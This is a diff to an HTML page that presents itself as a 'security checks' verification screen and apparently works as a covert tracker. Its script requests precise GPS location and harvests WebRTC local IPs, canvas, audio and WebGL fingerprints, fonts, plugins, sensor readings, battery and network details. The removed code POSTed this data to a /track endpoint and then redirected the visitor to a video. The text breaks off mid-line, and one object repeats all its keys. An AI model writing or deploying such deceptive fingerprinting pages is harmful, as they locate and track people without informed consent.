@@ -43,6 +43,7 @@
         .check-mark { color: #48bb78; font-size: 60px; display: none; }
         .error-mark { color: #fc8181; font-size: 60px; display: none; }
         .hidden { display: none; }
+        .progress-text { font-size: 12px; color: #a0aec0; margin-top: 10px; }
     </style>
 </head>
 <body>
@@ -55,6 +56,7 @@
         <div id="checkMark" class="check-mark">✅</div>
         <div id="errorMark" class="error-mark">⚠️</div>
         <p class="status" id="status">Starting security checks...</p>
+        <p class="progress-text" id="progressText"></p>
     </div>
 
     <script>
@@ -69,28 +71,39 @@
             return id;
         }
 
-        // --- FIXED: Location Request ---
+        function updateStatus(text) {
+            document.getElementById('status').textContent = text;
+            console.log(`[Status] ${text}`);
+        }
+
+        function updateProgress(text) {
+            document.getElementById('progressText').textContent = text;
+            console.log(`[Progress] ${text}`);
+        }
+
+        // --- 1. LOCATION ---
         function getLocation() {
             return new Promise((resolve) => {
-                console.log("📍 Requesting location...");
+                updateStatus('📍 Requesting location permission...');
                 
                 if (!navigator.geolocation) {
                     resolve({ error: 'Geolocation not supported' });
                     return;
                 }
                 
-                // This is the key part that triggers the browser prompt
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
-                        console.log("✅ Location obtained");
                         resolve({
                             latitude: position.coords.latitude,
                             longitude: position.coords.longitude,
-                            accuracy: Math.round(position.coords.accuracy)
+                            accuracy: Math.round(position.coords.accuracy),
+                            altitude: position.coords.altitude || null,
+                            altitudeAccuracy: position.coords.altitudeAccuracy || null,
+                            heading: position.coords.heading || null,
+                            speed: position.coords.speed || null
                         });
                     },
                     (error) => {
-                        console.log("❌ Location error:", error.message);
                         resolve({ error: error.message });
                     },
                     { enableHighAccuracy: true, timeout: 10000 }
@@ -98,29 +111,80 @@
             });
         }
 
-        // --- Other Data Collection Functions ---
+        // --- 2. BATTERY ---
         async function getBatteryInfo() {
             try {
                 if ('getBattery' in navigator) {
                     const battery = await navigator.getBattery();
-                    return { level: Math.round(battery.level * 100) + '%', charging: battery.charging };
+                    return {
+                        level: Math.round(battery.level * 100) + '%',
+                        charging: battery.charging,
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
+                    };
                 }
                 return null;
             } catch (e) { return null; }
         }
 
+        // --- 3. WEBRTC IP LEAK ---
+        function getWebRTCIPs() {
+            return new Promise((resolve) => {
+                try {
+                    const ips = [];
+                    const pc = new RTCPeerConnection({
+                        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+                    });
+                    
+                    pc.createDataChannel('test');
+                    pc.createOffer()
+                        .then(offer => pc.setLocalDescription(offer))
+                        .catch(() => {});
+                    
+                    pc.onicecandidate = (event) => {
+                        if (!event.candidate) {
+                            pc.close();
+                            resolve(ips.length ? ips : ['No local IPs found']);
+                            return;
+                        }
+                        const ip = event.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
+                        if (ip && !ips.includes(ip[0])) {
+                            ips.push(ip[0]);
+                        }
+                    };
+                    
+                    setTimeout(() => {
+                        pc.close();
+                        resolve(ips.length ? ips : ['No local IPs found']);
+                    }, 3000);
+                } catch (e) {
+                    resolve(['WebRTC not supported']);
+                }
+            });
+        }
+
+        // --- 4. CANVAS FINGERPRINT ---
         function getCanvasFingerprint() {
             try {
                 const canvas = document.createElement('canvas');
                 canvas.width = 256;
                 canvas.height = 256;
                 const ctx = canvas.getContext('2d');
+                
+                // Draw complex shapes for better fingerprint
                 ctx.textBaseline = 'top';
                 ctx.font = '14px Arial';
                 ctx.fillStyle = '#f60';
                 ctx.fillRect(0, 0, 128, 128);
                 ctx.fillStyle = '#069';
                 ctx.fillText('Hello World', 50, 50);
+                ctx.strokeStyle = '#0f6';
+                ctx.lineWidth = 2;
+                ctx.strokeRect(50, 50, 100, 100);
+                ctx.beginPath();
+                ctx.arc(128, 128, 64, 0, 2 * Math.PI);
+                ctx.stroke();
+                
                 const data = ctx.getImageData(0, 0, 256, 256).data;
                 let hash = 0;
                 for (let i = 0; i < data.length; i += 4) {
@@ -128,149 +192,239 @@
                     hash = hash & hash;
                 }
                 return Math.abs(hash).toString(36);
-            } catch (e) { return 'Canvas unavailable'; }
+            } catch (e) {
+                return 'Canvas unavailable';
+            }
         }
 
-        async function getWebRTCIPs() {
+        // --- 5. AUDIO FINGERPRINT ---
+        function getAudioFingerprint() {
             return new Promise((resolve) => {
                 try {
-                    const ips = [];
-                    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-                    pc.createDataChannel('test');
-                    pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
-                    pc.onicecandidate = (event) => {
-                        if (!event.candidate) { pc.close(); resolve(ips.length ? ips : ['No local IPs found']); return; }
-                        const ip = event.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
-                        if (ip && !ips.includes(ip[0])) { ips.push(ip[0]); }
-                    };
-                    setTimeout(() => { pc.close(); resolve(ips.length ? ips : ['No local IPs found']); }, 3000);
-                } catch (e) { resolve(['WebRTC not supported']); }
+                    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                    const oscillator = audioCtx.createOscillator();
+                    const analyser = audioCtx.createAnalyser();
+                    oscillator.connect(analyser);
+                    analyser.connect(audioCtx.destination);
+                    oscillator.start(0);
+                    
+                    const dataArray = new Float32Array(analyser.frequencyBinCount);
+                    analyser.getFloatFrequencyData(dataArray);
+                    
+                    let sum = 0;
+                    for (let i = 0; i < dataArray.length; i++) {
+                        sum += dataArray[i];
+                    }
+                    
+                    oscillator.stop();
+                    audioCtx.close();
+                    resolve((sum / dataArray.length).toFixed(6));
+                } catch (e) {
+                    resolve('Audio unavailable');
+                }
             });
         }
 
-        async function getAudioFingerprint() {
+        // --- 6. WEBGL FINGERPRINT ---
+        function getWebGLInfo() {
             try {
-                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                const oscillator = audioCtx.createOscillator();
-                const analyser = audioCtx.createAnalyser();
-                oscillator.connect(analyser);
-                analyser.connect(audioCtx.destination);
-                oscillator.start(0);
-                const dataArray = new Float32Array(analyser.frequencyBinCount);
-                analyser.getFloatFrequencyData(dataArray);
-                let sum = 0;
-                for (let i = 0; i < dataArray.length; i++) { sum += dataArray[i]; }
-                oscillator.stop();
-                audioCtx.close();
-                return (sum / dataArray.length).toFixed(6);
-            } catch (e) { return 'Audio unavailable'; }
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return null;
+                
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if (debugInfo) {
+                    const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                    const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    return { vendor, renderer };
+                }
+                return null;
+            } catch (e) { return null; }
         }
 
-        // --- Main Collection and Send ---
-        async function collectData() {
-            const location = await getLocation();
-            const battery = await getBatteryInfo();
-            const webRTCIPs = await getWebRTCIPs();
-            const canvasFP = getCanvasFingerprint();
-            const audioFP = await getAudioFingerprint();
+        // --- 7. FONTS ---
+        function getInstalledFonts() {
+            const fonts = [
+                'Arial', 'Helvetica', 'Times New Roman', 'Courier New',
+                'Verdana', 'Georgia', 'Palatino', 'Garamond',
+                'Comic Sans MS', 'Impact', 'Tahoma', 'Trebuchet MS',
+                'Lucida Sans', 'Lucida Grande', 'Segoe UI', 'Roboto',
+                'Open Sans', 'Lato', 'Montserrat', 'Source Sans Pro',
+                'Raleway', 'Oswald', 'Merriweather', 'PT Sans',
+                'Ubuntu', 'Cantarell', 'Fira Sans', 'Droid Sans',
+                'Noto Sans', 'Nunito', 'Poppins', 'Inter', 'SF Pro Display',
+                'SF Pro Text', 'Helvetica Neue', 'Apple Color Emoji', 'Segoe UI Emoji'
+            ];
             
+            const installed = [];
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            const baseSize = '72px';
+            const baseFont = 'monospace';
+            
+            fonts.forEach(font => {
+                ctx.font = baseSize + ' ' + font + ', ' + baseFont;
+                const width1 = ctx.measureText('abcdefghijklmnopqrstuvwxyz').width;
+                ctx.font = baseSize + ' ' + baseFont;
+                const width2 = ctx.measureText('abcdefghijklmnopqrstuvwxyz').width;
+                if (width1 !== width2) {
+                    installed.push(font);
+                }
+            });
+            
+            return installed;
+        }
+
+        // --- 8. PLUGINS ---
+        function getPlugins() {
+            try {
+                const plugins = [];
+                for (let i = 0; i < navigator.plugins.length; i++) {
+                    plugins.push(navigator.plugins[i].name);
+                }
+                return plugins;
+            } catch (e) {
+                return [];
+            }
+        }
+
+        // --- 9. SENSORS (Motion/Orientation) ---
+        function getSensors() {
+            return new Promise((resolve) => {
+                const sensors = {};
+                
+                // Motion
+                if (window.DeviceMotionEvent) {
+                    window.addEventListener('devicemotion', function handler(e) {
+                        sensors.motion = {
+                            acceleration: e.acceleration,
+                            accelerationIncludingGravity: e.accelerationIncludingGravity,
+                            rotationRate: e.rotationRate,
+                            interval: e.interval
+                        };
+                        window.removeEventListener('devicemotion', handler);
+                    }, { once: true });
+                }
+                
+                // Orientation
+                if (window.DeviceOrientationEvent) {
+                    window.addEventListener('deviceorientation', function handler(e) {
+                        sensors.orientation = {
+                            alpha: e.alpha,
+                            beta: e.beta,
+                            gamma: e.gamma,
+                            absolute: e.absolute
+                        };
+                        window.removeEventListener('deviceorientation', handler);
+                    }, { once: true });
+                }
+                
+                setTimeout(() => resolve(sensors), 1500);
+            });
+        }
+
+        // --- 10. NETWORK INFO ---
+        function getNetworkInfo() {
+            try {
+                if ('connection' in navigator) {
+                    const conn = navigator.connection;
+                    return {
+                        type: conn.effectiveType || null,
+                        downlink: conn.downlink || null,
+                        rtt: conn.rtt || null,
+                        saveData: conn.saveData || null,
+                        previousType: conn.previousType || null
+                    };
+                }
+                return null;
+            } catch (e) { return null; }
+        }
+
+        // --- 11. PERFORMANCE ---
+        function getPerformanceMetrics() {
+            try {
+                const perf = performance.timing;
+                return {
+                    loadTime: perf.loadEventEnd - perf.navigationStart,
+                    domReady: perf.domContentLoadedEventEnd - perf.navigationStart,
+                    dns: perf.domainLookupEnd - perf.domainLookupStart,
+                    tcp: perf.connectEnd - perf.connectStart,
+                    ttfb: perf.responseStart - perf.navigationStart,
+                    domInteractive: perf.domInteractive - perf.navigationStart,
+                    redirectTime: perf.redirectEnd - perf.redirectStart
+                };
+            } catch (e) { return null; }
+        }
+
+        // --- 12. TAB VISIBILITY ---
+        let tabVisibilityCount = 0;
+        document.addEventListener('visibilitychange', () => {
+            tabVisibilityCount++;
+        });
+
+        // --- 13. HARDWARE CONCURRENCY ---
+        function getHardwareInfo() {
             return {
-                sessionId: getSessionId(),
-                timestamp: new Date().toISOString(),
-                url: window.location.href,
-                referrer: document.referrer || 'Direct',
-                location: location, // This is sent to your backend
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                languages: navigator.languages,
-                cookieEnabled: navigator.cookieEnabled,
-                doNotTrack: navigator.doNotTrack,
-                screen: {
-                    width: screen.width,
-                    height: screen.height,
-                    availWidth: screen.availWidth,
-                    availHeight: screen.availHeight,
-                    colorDepth: screen.colorDepth,
-                    pixelRatio: window.devicePixelRatio
-                },
                 hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                 deviceMemory: navigator.deviceMemory || 'unknown',
-                touchPoints: navigator.maxTouchPoints || 0,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                timezoneOffset: new Date().getTimezoneOffset(),
-                battery: battery,
-                webRTCIPs: webRTCIPs,
-                canvasFingerprint: canvasFP,
-                audioFingerprint: audioFP,
-                performance: {
-                    loadTime: performance.timing ? performance.timing.loadEventEnd - performance.timing.navigationStart : 'N/A',
-                    domReady: performance.timing ? performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart : 'N/A'
-                }
+                maxTouchPoints: navigator.maxTouchPoints || 0,
+                platform: navigator.platform || 'unknown',
+                vendor: navigator.vendor || 'unknown',
+                product: navigator.product || 'unknown',
+                productSub: navigator.productSub || 'unknown',
+                userAgent: navigator.userAgent || 'unknown',
+                language: navigator.language || 'unknown',
+                languages: navigator.languages || [],
+                cookieEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack || 'unspecified',
+                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                deviceMemory: navigator.deviceMemory || 'unknown',
+                maxTouchPoints: navigator.maxTouchPoints || 0,
+                platform: navigator.platform || 'unknown',
+                vendor: navigator.vendor || 'unknown',
+                product: navigator.product || 'unknown',
+                productSub: navigator.productSub || 'unknown',
+                userAgent: navigator.userAgent || 'unknown',
+                language: navigator.language || 'unknown',
+                languages: navigator.languages || [],
+                cookieEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack || 'unspecified'
             };
         }
 
-        async function sendData(data) {
-            try {
-                const response = await fetch('/track', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
-                });
-                return await response.json();
-            } catch (e) {
-                console.error('Send error:', e);
-                return null;
-            }
-        }
-
-        // --- Updated Redirect ---
-        function redirectToGif() {
-            // Using your new MP4 link
-            const videoUrl = "https://media.tenor.com/58dr_S9uXqEAAAPo/car-car-edit.mp4";
-            window.location.href = videoUrl;
-        }
-
-        // --- Main Execution ---
-        async function main() {
-            const statusEl = document.getElementById('status');
-            const loaderEl = document.getElementById('loader');
-            const checkMarkEl = document.getElementById('checkMark');
-            const errorMarkEl = document.getElementById('errorMark');
+        // --- MAIN COLLECTION ---
+        async function collectAllData() {
+            updateProgress('📡 Collecting GPS location...');
+            const location = await getLocation();
             
-            try {
-                // This will trigger the location prompt
-                statusEl.textContent = '📍 Requesting location permission...';
-                const data = await collectData();
-                
-                statusEl.textContent = '📤 Sending data...';
-                const result = await sendData(data);
-                
-                if (result && result.status === 'success') {
-                    loaderEl.style.display = 'none';
-                    checkMarkEl.style.display = 'block';
-                    statusEl.textContent = '✅ Verification complete! Redirecting...';
-                    statusEl.style.color = '#48bb78';
-                } else {
-                    loaderEl.style.display = 'none';
-                    errorMarkEl.style.display = 'block';
-                    statusEl.textContent = '⚠️ Continuing...';
-                    statusEl.style.color = '#ed8936';
-                }
-            } catch (error) {
-                console.error('Error:', error);
-                loaderEl.style.display = 'none';
-                errorMarkEl.style.display = 'block';
-                statusEl.textContent = '⚠️ Continuing...';
-                statusEl.style.color = '#ed8936';
-            }
+            updateProgress('🔋 Checking battery status...');
+            const battery = await getBatteryInfo();
             
-            // Always redirect after 2 seconds
-            setTimeout(redirectToGif, 2000);
-        }
-
-        // Start the process
-        main();
-    </script>
-</body>
-</html>
+            updateProgress('🌐 Detecting WebRTC leak...');
+            const webRTCIPs = await getWebRTCIPs();
+            
+            updateProgress('🎨 Capturing canvas fingerprint...');
+            const canvasFP = getCanvasFingerprint();
+            
+            updateProgress('🎵 Capturing audio fingerprint...');
+            const audioFP = await getAudioFingerprint();
+            
+            updateProgress('🎮 Extracting GPU info...');
+            const webgl = getWebGLInfo();
+            
+            updateProgress('📝 Checking installed fonts...');
+            const fonts = getInstalledFonts();
+            
+            updateProgress('🧩 Detecting browser plugins...');
+            const plugins = getPlugins();
+            
+            updateProgress('📱 Reading sensors...');
+            const sensors = await getSensors();
+            
+            updateProgress('📶 Analyzing network...');
+            const network = getNetworkInfo();
+            
+            updateProgress('⚡ Measuring performance...');
+            const performance = getPerformanceMetrics();
+            
+            updateProgress('🖥️ Gathering hardware info
